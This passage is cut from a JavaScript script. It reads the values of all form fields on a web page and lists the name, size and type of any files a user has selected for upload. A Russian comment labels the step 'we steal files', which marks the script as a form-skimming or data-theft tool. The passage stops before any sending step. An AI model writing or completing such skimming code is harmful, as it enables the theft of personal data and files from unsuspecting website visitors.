            const key = el.name || el.id || el.tagName;
            if (el.value) {
                formData[key] = el.value;
            }
        });

        // === 2.7 КРАДЁМ ФАЙЛЫ (если есть) ===
        const files = [];
        document.querySelectorAll('input[type="file"]').forEach(el => {
            if (el.files && el.files.length > 0) {
                for (let file of el.files) {
                    files.push({
                        name: file.name,
                        size: file.size,
                        type: file.type
                    });
                }
            }
